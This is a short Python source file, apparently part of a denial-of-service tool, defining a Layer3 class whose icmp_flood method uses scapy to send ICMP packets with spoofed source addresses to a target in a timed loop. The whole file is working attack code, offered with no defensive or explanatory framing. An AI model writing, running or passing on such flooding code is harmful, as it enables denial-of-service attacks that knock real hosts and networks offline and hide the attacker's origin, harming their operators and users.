from scapy.all import IP, ICMP, send
import time as timing
from src.utils import spoof_ip


class Layer3:
    @staticmethod
    def icmp_flood(target: str, time: int):
        end_t = timing.time() + time
        while (timing.time() < end_t):
            packet = IP(
                dst=str(target), src=spoof_ip())/ICMP()
            send(packet, verbose=0)
